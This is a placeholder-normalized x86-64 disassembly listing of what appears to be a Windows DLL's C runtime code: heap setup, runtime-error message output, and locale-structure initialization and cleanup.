mov eax 0x78
add bl r15b
add r10 0x2
mov [ rsp + 0x60 ] r10
cmp r12w ax
jae r-xdata
cmp [ rsp + 0x34 ] r14b
jne r-xdata
mov rax [ rsp + 0x90 ]
lea r9 [ rsp + 0xf0 ]
lea r8 [ rsp + 0x90 ]
mov [ rax + rbx * 2 ] cx
lea rax [ rsp + 0x98 ]
add rbx r13
lea rdx [ rsp + 0xa8 ]
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_1800135c4
cmp eax r14d
je r-xdata
movzx eax si
movzx ecx al
call sub_18001a9f0
cmp eax r14d
je r-xdata
movzx eax si
movzx ecx al
call sub_18001a9f0
cmp eax r14d
je r-xdata
mov r9w r12w
mov r12w ax
movzx r9d ax
jmp r-xdata
mov rax [ rsp + 0xa8 ]
mov r12d [ rsp + 0x78 ]
mov rbp [ rsp + 0x90 ]
mov [ rbp + rbx * 2 ] r14w
lea rbx [ rax + rax + 0x2 ]
add r12d r13d
mov rcx rbx
mov [ rsp + 0x78 ] r12d
call sub_1800114a4
mov rdi rax
cmp rax r14
je r-xdata
mov rcx r12
add r15d r13d
call sub_18001aaf4
mov ecx 0x2d
mov si ax
mov [ rsp + 0x38 ] esi
cmp cx ax
jne r-xdata
mov eax edi
sub edi r13d
cmp eax r14d
je r-xdata
mov r12w bp
jmp r-xdata
movzx r10d r12w
cmp r12w r9w
ja r-xdata
lea rax [ rbx - 0x1 ]
mov r9 rbp
mov r8 rbx
mov rdx rdi
xor ecx ecx
mov [ rsp + 0x20 ] rax
call sub_18001b368
cmp eax r14d
je r-xdata
mov eax 0x2b
cmp ax si
jne r-xdata
mov rax [ rsp + 0x90 ]
lea r9 [ rsp + 0xf0 ]
lea r8 [ rsp + 0x90 ]
mov [ rax + rbx * 2 ] cx
lea rax [ rsp + 0x98 ]
add rbx r13
lea rdx [ rsp + 0xa8 ]
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_1800135c4
cmp eax r14d
je r-xdata
mov rax [ rsp + 0x90 ]
add [ rsp + 0x58 ] r13d
lea r9 [ rsp + 0xf0 ]
mov [ rax + rbx * 2 ] si
lea rax [ rsp + 0x98 ]
add rbx r13
lea r8 [ rsp + 0x90 ]
lea rdx [ rsp + 0xa8 ]
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_1800135c4
cmp eax r14d
je r-xdata
mov cx [ r10 ]
cmp dx cx
jne r-xdata
movzx eax r12w
mov r8 r10
mov edx r11d
and eax 0x7
shr r8 0x3
add r12w r11w
mov cl al
add r10 r11
shl dl cl
or [ r8 + rbx ] dl
cmp r12w r9w
jbe r-xdata
mov r10 [ rsp + 0x60 ]
mov edx 0x5d
movsx ebx [ rsp + 0x35 ]
mov rcx [ rw-data ]
sub ebx r13d
call DecodePointer
mov rdx [ rsp + 0xa0 ]
lea r9 [ rsp + 0xc8 ]
mov r8 rdi
mov ecx ebx
call rax
mov rcx rdi
call sub_18000e06c
jmp r-xdata
cmp eax 0x16
je r-xdata
mov eax 0xff00
test ax si
je r-xdata
mov eax edi
sub edi r13d
cmp eax r14d
jne r-xdata
jmp r-xdata
mov rcx r12
add r15d r13d
call sub_18001aaf4
mov si ax
mov [ rsp + 0x38 ] esi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r14
call sub_18001063c
cmp eax 0x22
jne r-xdata
movzx eax si
movzx ecx al
call sub_18001a9f0
cmp eax r14d
je r-xdata
mov rcx r12
add r15d r13d
call sub_18001aaf4
mov si ax
mov [ rsp + 0x38 ] esi
mov edi r14d
jmp r-xdata
mov eax edi
sub edi r13d
cmp eax r14d
je r-xdata
mov rax [ rsp + 0x90 ]
lea r9 [ rsp + 0xf0 ]
lea r8 [ rsp + 0x90 ]
mov [ rax + rbx * 2 ] si
lea rax [ rsp + 0x98 ]
add rbx r13
lea rdx [ rsp + 0xa8 ]
mov rcx rbx
add ebp r13d
mov [ rsp + 0x20 ] rax
call sub_1800135c4
cmp eax r14d
je r-xdata
sub_180014a18
sub rsp 0x38
test rcx rcx
jne r-xdata
mov r8 rcx
mov rcx [ rw-data ]
xor edx edx
call [ HeapSize@IAT ]
call sub_180010834
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180010764
or rax 0xffffffffffffffff
jmp r-xdata
add rsp 0x38
retn
sub_180014a60
mov [ rsp + 0x8 ] ecx
sub rsp 0x28
xor r8d r8d
mov edx 0x1000
xor ecx ecx
call [ HeapCreate@IAT ]
mov [ rw-data ] rax
test rax rax
je r-xdata
add rsp 0x28
retn
lea r8 [ rsp + 0x30 ]
mov r9d 0x4
xor edx edx
mov rcx rax
mov [ rsp + 0x30 ] 0x2
call [ HeapSetInformation@IAT ]
mov eax 0x1
sub_180014acc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rdi
mov [ rsp + 0x20 ] r13
push r14
sub rsp 0x30
lea r14 [ rw-data ]
mov edi ecx
xor ebx ebx
mov rax r14
cmp ebx 0x17
jae r-xdata
inc ebx
add rax 0x10
cmp ebx 0x17
jb r-xdata
mov rbx [ rsp + 0x40 ]
mov rdi [ rsp + 0x50 ]
mov r13 [ rsp + 0x58 ]
add rsp 0x30
pop r14
retn
mov ecx 0x3
call sub_18001b57c
cmp eax 0x1
je r-xdata
cmp ecx [ rax ]
je r-xdata
mov ecx 0xfffffff4
call [ GetStdHandle@IAT ]
mov rdi rax
test rax rax
je r-xdata
mov ecx 0x3
call sub_18001b57c
test eax eax
jne r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
cmp edi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
movsxd rbx ebx
add rbx rbx
mov rcx [ r14 + rbx * 8 + 0x8 ]
call sub_1800174b0
mov rdx [ r14 + rbx * 8 + 0x8 ]
and [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x48 ]
mov r8 rax
mov rcx rdi
call [ WriteFile@IAT ]
lea rdi [ rw-data ]
mov r13d 0x314
lea r8 [ r--data ]
mov rcx rdi
mov rdx r13
call sub_18001695c
test eax eax
je r-xdata
lea rdx [ rw-data ]
mov r8d 0x104
xor ecx ecx
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001063c
lea rcx [ rw-data ]
call sub_1800174b0
inc rax
cmp rax 0x3c
jbe r-xdata
lea r8 [ r--data ]
lea rcx [ rw-data ]
mov edx 0x2fb
call sub_18001695c
test eax eax
je r-xdata
lea r8 [ r--data ]
mov rdx r13
mov rcx rdi
call sub_180016668
test eax eax
je r-xdata
lea rcx [ rw-data ]
call sub_1800174b0
lea rdx [ rw-data ]
lea r8 [ r--data ]
lea rcx [ rax + rdi - 0x22 ]
mov r9d 0x3
sub rdx rcx
call sub_180016788
test eax eax
je r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001063c
movsxd r8 ebx
mov rdx r13
mov rcx rdi
add r8 r8
mov r8 [ r14 + r8 * 8 + 0x8 ]
call sub_180016668
test eax eax
je r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001063c
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001063c
lea rdx [ r--data ]
mov r8d 0x12010
mov rcx rdi
call sub_18001b388
jmp r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001063c
sub_180014cf4
sub rsp 0x28
mov ecx 0x3
call sub_18001b57c
cmp eax 0x1
je r-xdata
mov ecx 0xfc
call sub_180014acc
mov ecx 0xff
call sub_180014acc
mov ecx 0x3
call sub_18001b57c
test eax eax
jne r-xdata
add rsp 0x28
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_180014d38
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x40
movzx esi [ rdx + 0x42 ]
movzx ebp [ rdx + 0x44 ]
mov rdi rcx
test rcx rcx
jne r-xdata
and [ rsp + 0x38 ] 0x0
lea rax [ rcx + 0x8 ]
mov r9d 0x31
lea r12d [ r9 - 0x30 ]
mov [ rsp + 0x30 ] rdx
lea rcx [ rsp + 0x30 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea rcx [ rdi + 0x10 ]
lea r9d [ r12 + 0x31 ]
mov [ rsp + 0x20 ] rcx
lea rcx [ rsp + 0x30 ]
mov r8d esi
mov edx r12d
mov ebx eax
call sub_180019a40
lea rcx [ rdi + 0x18 ]
lea r9d [ r12 + 0x32 ]
mov [ rsp + 0x20 ] rcx
lea rcx [ rsp + 0x30 ]
mov r8d esi
mov edx r12d
or ebx eax
call sub_180019a40
lea r9d [ r12 + 0x33 ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0x20 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x34 ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0x28 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x35 ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0x30 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x36 ]
lea rcx [ rsp + 0x30 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rdi
or ebx eax
call sub_180019a40
lea r9d [ r12 + 0x29 ]
or ebx eax
lea rax [ rdi + 0x40 ]
lea rcx [ rsp + 0x30 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x2a ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0x48 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x2b ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0x50 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
or ebx eax
lea rax [ rdi + 0x58 ]
lea r9d [ r12 + 0x2c ]
lea rcx [ rsp + 0x30 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x2d ]
or ebx eax
lea rax [ rdi + 0x60 ]
lea rcx [ rsp + 0x30 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x2e ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0x68 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x2f ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0x38 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x43 ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0x70 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x44 ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0x78 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x45 ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0x80 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x46 ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0x88 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x47 ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0x90 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x48 ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0x98 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
or ebx eax
lea rax [ rdi + 0xa0 ]
lea r9d [ r12 + 0x49 ]
lea rcx [ rsp + 0x30 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x4a ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0xa8 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x4b ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0xb0 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x4c ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0xb8 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x4d ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0xc0 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x4e ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0xc8 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x37 ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0xd0 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x38 ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0xd8 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x39 ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0xe0 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x3a ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0xe8 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
or ebx eax
lea rax [ rdi + 0xf0 ]
lea r9d [ r12 + 0x3b ]
lea rcx [ rsp + 0x30 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x3c ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0xf8 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x3d ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0x100 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x3e ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0x108 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x3f ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0x110 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x40 ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0x118 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x41 ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0x120 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x42 ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0x128 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x27 ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0x130 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea r9d [ r12 + 0x28 ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0x138 ]
mov r8d esi
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
or ebx eax
lea rax [ rdi + 0x140 ]
mov [ rsp + 0x20 ] rax
lea r9d [ r12 + 0x1e ]
lea rcx [ rsp + 0x30 ]
mov r8d ebp
mov edx r12d
call sub_180019a40
lea r9d [ r12 + 0x1f ]
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rdi + 0x148 ]
mov r8d ebp
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea rcx [ rsp + 0x30 ]
mov r9d 0x1003
or ebx eax
lea rax [ rdi + 0x150 ]
mov r8d ebp
mov edx r12d
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea rcx [ rsp + 0x30 ]
mov r9d 0x1009
or ebx eax
lea rax [ rdi + 0x15c ]
mov r8d ebp
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180019a40
mov [ rdi + 0x158 ] ebp
or eax ebx
or eax 0xffffffff
jmp r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
sub_18001536c
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x8 ]
call sub_18000e06c
mov rcx [ rbx + 0x10 ]
call sub_18000e06c
mov rcx [ rbx + 0x18 ]
call sub_18000e06c
mov rcx [ rbx + 0x20 ]
call sub_18000e06c
mov rcx [ rbx + 0x28 ]
call sub_18000e06c
mov rcx [ rbx + 0x30 ]
call sub_18000e06c
mov rcx [ rbx ]
call sub_18000e06c
mov rcx [ rbx + 0x40 ]
call sub_18000e06c
mov rcx [ rbx + 0x48 ]
call sub_18000e06c
mov rcx [ rbx + 0x50 ]
call sub_18000e06c
mov rcx [ rbx + 0x58 ]
call sub_18000e06c
mov rcx [ rbx + 0x60 ]
call sub_18000e06c
mov rcx [ rbx + 0x68 ]
call sub_18000e06c
mov rcx [ rbx + 0x38 ]
call sub_18000e06c
mov rcx [ rbx + 0x70 ]
call sub_18000e06c
mov rcx [ rbx + 0x78 ]
call sub_18000e06c
mov rcx [ rbx + 0x80 ]
call sub_18000e06c
mov rcx [ rbx + 0x88 ]
call sub_18000e06c
mov rcx [ rbx + 0x90 ]
call sub_18000e06c
mov rcx [ rbx + 0x98 ]
call sub_18000e06c
mov rcx [ rbx + 0xa0 ]
call sub_18000e06c
mov rcx [ rbx + 0xa8 ]
call sub_18000e06c
mov rcx [ rbx + 0xb0 ]
call sub_18000e06c
mov rcx [ rbx + 0xb8 ]
call sub_18000e06c
mov rcx [ rbx + 0xc0 ]
call sub_18000e06c
mov rcx [ rbx + 0xc8 ]
call sub_18000e06c
mov rcx [ rbx + 0xd0 ]
call sub_18000e06c
mov rcx [ rbx + 0xd8 ]
call sub_18000e06c
mov rcx [ rbx + 0xe0 ]
call sub_18000e06c
mov rcx [ rbx + 0xe8 ]
call sub_18000e06c
mov rcx [ rbx + 0xf0 ]
call sub_18000e06c
mov rcx [ rbx + 0xf8 ]
call sub_18000e06c
mov rcx [ rbx + 0x100 ]
call sub_18000e06c
mov rcx [ rbx + 0x108 ]
call sub_18000e06c
mov rcx [ rbx + 0x110 ]
call sub_18000e06c
mov rcx [ rbx + 0x118 ]
call sub_18000e06c
mov rcx [ rbx + 0x120 ]
call sub_18000e06c
mov rcx [ rbx + 0x128 ]
call sub_18000e06c
mov rcx [ rbx + 0x130 ]
call sub_18000e06c
mov rcx [ rbx + 0x138 ]
call sub_18000e06c
mov rcx [ rbx + 0x140 ]
call sub_18000e06c
mov rcx [ rbx + 0x148 ]
call sub_18000e06c
mov rcx [ rbx + 0x150 ]
call sub_18000e06c
add rsp 0x20
pop rbx
sub_180015558
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
push rdi
sub rsp 0x20
cmp [ rcx + 0x20 ] 0x0
mov rdi rcx
lea rbp [ rw-data ]
je r-xdata
mov rbx rbp
mov edx 0x168
mov ecx 0x1
call sub_180011510
mov rbx rax
test rax rax
jne r-xdata
mov [ rdi + 0x158 ] rbx
xor eax eax
[ rax + 0x160 ] 0xffffffff
mov rdx rdi
mov rcx rax
call sub_180014d38
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
mov [ rbx + 0x160 ] 0x1
jmp r-xdata
mov rcx rbx
call sub_18001536c
mov rcx rbx
call sub_18000e06c
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rax [ rdi + 0x158 ]
cmp rax rbp
je r-xdata
sub_1800155f4
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
cmp rcx [ rw-data ]
je r-xdata
mov rcx [ rbx + 0x8 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18000e06c
mov rcx [ rbx + 0x10 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18000e06c
add rsp 0x20
pop rbx
call sub_18000e06c
sub_18001563c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
xor ebx ebx
mov rsi rcx
mov [ rax - 0x38 ] rcx
mov [ rax - 0x30 ] rbx
cmp [ rcx + 0x1c ] ebx
jne r-xdata
mov edi 0x58
mov rdx rdi
lea r12d [ rdi - 0x57 ]
mov rcx r12
call sub_180011510
mov rbp rax
cmp rax rbx
jne r-xdata
cmp [ rcx + 0x18 ] ebx
jne r-xdata
mov rdx [ rsi + 0x128 ]
mov rcx rax
mov r8 rdi
call sub_1800160e0
mov edi 0x4
mov rcx rdi
call sub_1800114a4
mov r14 rax
cmp rax rbx
jne r-xdata
mov eax r12d
jmp r-xdata
mov r13 rbx
mov r14 rbx
lea rbp [ rw-data ]
jmp r-xdata
mov [ rax ] ebx
cmp [ rsi + 0x1c ] ebx
je r-xdata
mov rcx rbp
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rax [ rsi + 0x118 ]
cmp rax rbx
je r-xdata
mov rax [ rw-data ]
mov r13 rbx
mov [ rbp ] rax
mov rax [ rw-data ]
mov [ rbp + 0x8 ] rax
mov rax [ rw-data ]
mov [ rbp + 0x10 ] rax
mov rcx rdi
call sub_1800114a4
mov r13 rax
cmp rax rbx
je r-xdata
mov rcx [ rsi + 0x110 ]
cmp rcx rbx
je r-xdata
[ rax ] 0xffffffff
mov [ r13 ] r12d
mov rcx rbp
call sub_18000e06c
mov rcx r14
jmp r-xdata
mov [ rax ] ebx
movzx edi [ rsi + 0x3e ]
lea rcx [ rsp + 0x30 ]
mov r9d 0xe
mov edx r12d
mov r8d edi
mov [ rsp + 0x20 ] rbp
call sub_180019a40
lea rcx [ rbp + 0x8 ]
mov [ rsp + 0x20 ] rcx
lea rcx [ rsp + 0x30 ]
mov r9d 0xf
mov r8d edi
mov edx r12d
mov ebx eax
call sub_180019a40
lea r15 [ rbp + 0x10 ]
lea rcx [ rsp + 0x30 ]
mov r9d 0x10
mov r8d edi
mov edx r12d
or ebx eax
mov [ rsp + 0x20 ] r15
call sub_180019a40
or eax ebx
je r-xdata
mov [ rsi + 0x118 ] r13
mov [ rsi + 0x110 ] r14
mov [ rsi + 0x128 ] rbp
xor eax eax
[ rcx ] 0xffffffff
jne r-xdata
call sub_18000e06c
jmp r-xdata
mov rdx [ r15 ]
xor ebx ebx
jmp r-xdata
mov rcx rbp
call sub_1800155f4
or r12d 0xffffffff
mov rcx [ rsi + 0x110 ]
call sub_18000e06c
mov rcx [ rsi + 0x128 ]
call sub_18000e06c
cmp [ rdx ] bl
jne r-xdata
mov al [ rdx ]
cmp al 0x30
jl r-xdata
jmp r-xdata
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
mov [ r14 ] r12d
cmp r13 rbx
je r-xdata
add rdx r12
mov r8 rdx
sub al 0x30
mov [ rdx ] al
mov al [ r8 + 0x1 ]
mov [ r8 ] al
inc r8
cmp al bl
jne r-xdata
jmp r-xdata
sub_180015848
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x18 ]
cmp rcx [ rw-data ]
je r-xdata
mov rcx [ rbx + 0x20 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18000e06c
mov rcx [ rbx + 0x28 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18000e06c
mov rcx [ rbx + 0x30 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18000e06c
mov rcx [ rbx + 0x38 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18000e06c
mov rcx [ rbx + 0x40 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18000e06c
mov rcx [ rbx + 0x48 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18000e06c
add rsp 0x20
pop rbx
call sub_18000e06c
sub_1800158e0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x40
xor r12d r12d
mov rsi rcx
mov [ rax - 0x28 ] rcx
and [ rax - 0x20 ] r12
cmp [ rcx + 0x18 ] r12d
jne r-xdata
mov edi 0x58
mov rdx rdi
lea ecx [ rdi - 0x57 ]
call sub_180011510
mov rbp rax
test rax rax
jne r-xdata
cmp [ rcx + 0x1c ] r12d
jne r-xdata
mov ebx 0x4
mov rcx rbx
call sub_1800114a4
mov r13 rax
test rax rax
jne r-xdata
mov eax 0x1
jmp r-xdata
xor r13d r13d
lea rbp [ rw-data ]
jmp r-xdata
and [ rax ] r12d
cmp [ rsi + 0x18 ] r12d
je r-xdata
mov rcx rbp
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
mov rdi [ rsp + 0x78 ]
add rsp 0x40
pop r14
pop r13
pop r12
retn
mov rax [ rsi + 0x120 ]
test rax rax
je r-xdata
lea rdx [ rw-data ]
mov rcx rbp
mov r8 rdi
call sub_1800160e0
mov rcx rbx
call sub_1800114a4
mov r12 rax
test rax rax
jne r-xdata
mov rcx [ rsi + 0x110 ]
test rcx rcx
je r-xdata
[ rax ] 0xffffffff
mov [ r12 ] 0x1
and [ rax ] 0x0
movzx edi [ rsi + 0x38 ]
mov r9d 0x15
lea rax [ rbp + 0x18 ]
lea edx [ r9 - 0x14 ]
lea rcx [ rsp + 0x30 ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea rcx [ rbp + 0x20 ]
mov r9d 0x14
mov [ rsp + 0x20 ] rcx
lea edx [ r9 - 0x13 ]
lea rcx [ rsp + 0x30 ]
mov r8d edi
mov ebx eax
call sub_180019a40
lea rcx [ rbp + 0x28 ]
mov r9d 0x16
mov [ rsp + 0x20 ] rcx
lea edx [ r9 - 0x15 ]
lea rcx [ rsp + 0x30 ]
mov r8d edi
or ebx eax
call sub_180019a40
mov r9d 0x17
lea rcx [ rsp + 0x30 ]
or ebx eax
lea rax [ rbp + 0x30 ]
lea edx [ r9 - 0x16 ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180019a40
mov r9d 0x18
lea r14 [ rbp + 0x38 ]
lea rcx [ rsp + 0x30 ]
lea edx [ r9 - 0x17 ]
mov r8d edi
or ebx eax
mov [ rsp + 0x20 ] r14
call sub_180019a40
mov r9d 0x50
or ebx eax
lea rax [ rbp + 0x40 ]
lea rcx [ rsp + 0x30 ]
lea edx [ r9 - 0x4f ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180019a40
mov r9d 0x51
or ebx eax
lea rax [ rbp + 0x48 ]
lea rcx [ rsp + 0x30 ]
lea edx [ r9 - 0x50 ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea rcx [ rsp + 0x30 ]
mov r9d 0x1a
or ebx eax
lea rax [ rbp + 0x50 ]
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea rcx [ rsp + 0x30 ]
mov r9d 0x19
or ebx eax
lea rax [ rbp + 0x51 ]
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea rcx [ rsp + 0x30 ]
mov r9d 0x54
or ebx eax
lea rax [ rbp + 0x52 ]
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180019a40
or ebx eax
lea rax [ rbp + 0x53 ]
lea rcx [ rsp + 0x30 ]
mov r9d 0x55
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180019a40
lea rcx [ rsp + 0x30 ]
or ebx eax
